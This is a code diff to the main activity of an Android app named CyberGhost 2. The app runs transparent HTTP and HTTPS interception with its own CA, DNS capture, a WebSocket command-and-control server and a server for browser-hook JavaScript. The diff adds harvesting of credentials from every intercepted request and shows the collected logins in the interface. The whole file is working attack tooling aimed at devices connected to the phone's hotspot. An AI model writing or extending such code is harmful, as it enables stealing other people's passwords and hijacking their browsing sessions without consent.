@@ -52,6 +52,7 @@ class MainActivity : ComponentActivity() {
                 val interceptQueue = remember { mutableStateListOf<PendingIntercept>() }
                 val devices = remember { mutableStateListOf<ConnectedDevice>() }
                 val events = remember { mutableStateListOf<C2Event>() }
+                val credentials = remember { mutableStateListOf<HarvestedCredential>() }
                 var isRunning by remember { mutableStateOf(false) }
                 var mode by remember { mutableStateOf(InterceptMode.PASSTHROUGH) }
                 var config by remember { mutableStateOf(InjectionConfig()) }
@@ -73,55 +74,96 @@ class MainActivity : ComponentActivity() {
                                 p.mode = mode; p.start()
                                 launch {
                                     p.packets.collect { pkt ->
-                                        packets.add(pkt); if (packets.size > 2000) packets.removeAt(0)
+                                        packets.add(pkt)
+                                        if (packets.size > 2000) packets.removeAt(0)
                                         deviceManager?.trackRequest(pkt.sourceIp, pkt.headers["User-Agent"], pkt.body.size.toLong())
                                         trafficStats.recordPacket(pkt)
+                                        // harvest credentials from every request
+                                        if (pkt.isRequest) contentInjector?.harvester?.inspect(pkt)
+                                    }
+                                }
+                                // collect harvested credentials
+                                launch {
+                                    contentInjector?.harvester?.credentials?.collect { cred ->
+                                        credentials.add(cred)
                                     }
                                 }
                             }
+
                             transparentHttp = TransparentHttpServer(80, proxy!!, contentInjector!!).also { it.start() }
                             transparentHttps = TransparentHttpsServer(443, proxy!!, certManager!!, contentInjector!!).also { it.start() }
                             mediaServer = MediaServer(9090, this@MainActivity, hookJs).also { it.start() }
+
                             c2Server = WebSocketC2Server(9091, deviceManager!!).also { c2 ->
                                 c2.start()
                                 launch { c2.events.collect { event -> events.add(event); if (events.size > 500) events.removeAt(0) } }
                             }
+
                             dnsCapture = DnsCapture(5353, gatewayIp = "192.168.43.1", transparentMode = true).also { dns ->
                                 dns.start()
                                 launch { dns.queries.collect { trafficStats.recordDns() } }
                             }
+
                             launch {
                                 while (true) {
                                     kotlinx.coroutines.delay(500)
-                                    deviceManager?.let { dm -> devices.clear(); devices.addAll(dm.getAllDevices()); hookedSessions = dm.getHookedSessions() }
+                                    deviceManager?.let { dm ->
+                                        devices.clear(); devices.addAll(dm.getAllDevices())
+                                        hookedSessions = dm.getHookedSessions()
+                                    }
                                     updateNotification(devices.size, hookedSessions.count { it.isAlive }, trafficStats.totalPackets.get())
                                 }
                             }
-                            showNotification("Engines started")
+
+                            showNotification("Engines started — transparent intercept active")
                             Log.i("CG2", "All engines started")
                         } catch (e: Exception) {
-                            Log.e("CG2", "Start failed", e); isRunning = false
+                            Log.e("CG2", "Start failed", e)
+                            isRunning = false
                         }
                     } else {
-                        proxy?.stop(); proxy = null; transparentHttp?.stop(); transparentHttp = null
-                        transparentHttps?.stop(); transparentHttps = null; c2Server?.stop(); c2Server = null
-                        mediaServer?.stop(); mediaServer = null; dnsCapture?.stop(); dnsCapture = null
+                        proxy?.stop(); proxy = null
+                        transparentHttp?.stop(); transparentHttp = null
+                        transparentHttps?.stop(); transparentHttps = null
+                        c2Server?.stop(); c2Server = null
+                        mediaServer?.stop(); mediaServer = null
+                        dnsCapture?.stop(); dnsCapture = null
                         cancelNotification()
                     }
                 }
 
                 LaunchedEffect(mode) { proxy?.mode = mode }
                 LaunchedEffect(config) { contentInjector?.config = config }
+
                 LaunchedEffect(isRunning) {
-                    if (isRunning) { launch { while (true) { kotlinx.coroutines.delay(200); interceptQueue.clear(); interceptQueue.addAll(proxy?.interceptQueue?.toList() ?: emptyList()) } } }
+                    if (isRunning) {
+                        launch {
+                            while (true) {
+                                kotlinx.coroutines.delay(200)
+                                interceptQueue.clear()
+                                interceptQueue.addAll(proxy?.interceptQueue?.toList() ?: emptyList())
+                            }
+                        }
+                    }
                 }
 
                 CyberGhostApp(
-                    interceptQueue = interceptQueue, packets = packets, devices = devices,
-                    hookedSessions = hookedSessions, mode = mode, isRunning = isRunning,
-                    events = events, networkHosts = networkHosts, isScanning = isScanning,
-                    trafficStats = trafficStats, profiles = profiles, certInfos = certInfos,
-                    onModeChange = { mode = it }, onToggle = { isRunning = !isRunning },
+                    interceptQueue = interceptQueue,
+                    packets = packets,
+                    devices = devices,
+                    hookedSessions = hookedSessions,
+                    mode = mode,
+                    isRunning = isRunning,
+                    events = events,
+                    networkHosts = networkHosts,
+                    isScanning = isScanning,
+                    trafficStats = trafficStats,
+                    profiles = profiles,
+                    certInfos = certInfos,
+                    credentials = credentials,
+                    currentConfig = config,
+                    onModeChange = { mode = it },
+                    onToggle = { isRunning = !isRunning },
                     onForward = { id, pkt -> proxy?.forwardPacket(id, pkt) },
                     onDrop = { id -> proxy?.dropPacket(id) },
                     onCommand = { session, action, params ->
@@ -140,7 +182,10 @@ class MainActivity : ComponentActivity() {
                         }
                     },
                     onExportCa = { exportCa() },
-                    onExportHar = { val file = packetExporter.exportHar(packets.toList()); file?.let { packetExporter.shareFile(it) } },
+                    onExportHar = {
+                        val file = packetExporter.exportHar(packets.toList())
+                        file?.let { packetExporter.shareFile(it) }
+                    },
                     onConfigUpdate = { config = it },
                     onScanNetwork = { networkMapper.scan() },
                     onSaveProfile = { name -> profileManager.save(name, config); profiles = profileManager.list() },
@@ -152,6 +197,10 @@ class MainActivity : ComponentActivity() {
                             val info = certViewer.inspect(host)
                             info?.let { certInfoCache[host] = it; certInfos = certInfoCache.toMap() }
                         }
+                    },
+                    onClearCredentials = {
+                        credentials.clear()
+                        contentInjector?.harvester?.clear()
                     }
                 )
             }
@@ -161,27 +210,38 @@ class MainActivity : ComponentActivity() {
     private fun exportCa() {
         try {
             val pem = certManager?.getCaCertPem() ?: return
-            val file = File(cacheDir, "cyberghost_ca.crt"); file.writeText(pem)
+            val file = File(cacheDir, "cyberghost_ca.crt")
+            file.writeText(pem)
             val uri: Uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
-            startActivity(Intent.createChooser(Intent(Intent.ACTION_SEND).apply {
-                type = "application/x-x509-ca-cert"; putExtra(Intent.EXTRA_STREAM, uri); addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
-            }, "Export CyberGhost CA"))
-        } catch (e: Exception) { Log.e("CG2", "CA export failed", e) }
+            startActivity(Intent.createChooser(
+                Intent(Intent.ACTION_SEND).apply {
+                    type = "application/x-x509-ca-cert"
+                    putExtra(Intent.EXTRA_STREAM, uri)
+                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                }, "Export CyberGhost CA"
+            ))
+        } catch (e: Exception) {
+            Log.e("CG2", "CA export failed", e)
+        }
     }
 
     private fun createNotificationChannel() {
-        val channel = NotificationChannel("cg2_status", "CyberGhost Status", NotificationManager.IMPORTANCE_LOW).apply { setShowBadge(false) }
+        val channel = NotificationChannel("cg2_status", "CyberGhost Status", NotificationManager.IMPORTANCE_LOW)
+            .apply { setShowBadge(false) }
         getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
     }
 
     private fun showNotification(text: String) {
-        val n = NotificationCompat.Builder(this, "cg2_status").setContentTitle("CyberGhost 2").setContentText(text)
-            .setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build()
+        val n = NotificationCompat.Builder(this, "cg2_status")
+            .setContentTitle("CyberGhost 2")
+            .setContentText(text)
+            .setSmallIcon(android.R.drawable.ic_menu_manage)
+            .setOngoing(true).build()
         getSystemService(NotificationManager::class.java).notify(1337, n)
     }
 
     private fun updateNotification(devices: Int, hooked: Int, packets: Long) {
-        showNotification("D:$devices H:$hooked P:$packets")
+        showNotification("Devices: $devices  Hooked: $hooked  Packets: $packets")
     }
 
     private fun cancelNotification() {
@@ -191,6 +251,7 @@ class MainActivity : ComponentActivity() {
     override fun onDestroy() {
         proxy?.stop(); transparentHttp?.stop(); transparentHttps?.stop()
         c2Server?.stop(); mediaServer?.stop(); dnsCapture?.stop()
-        cancelNotification(); super.onDestroy()
+        cancelNotification()
+        super.onDestroy()
     }
 }
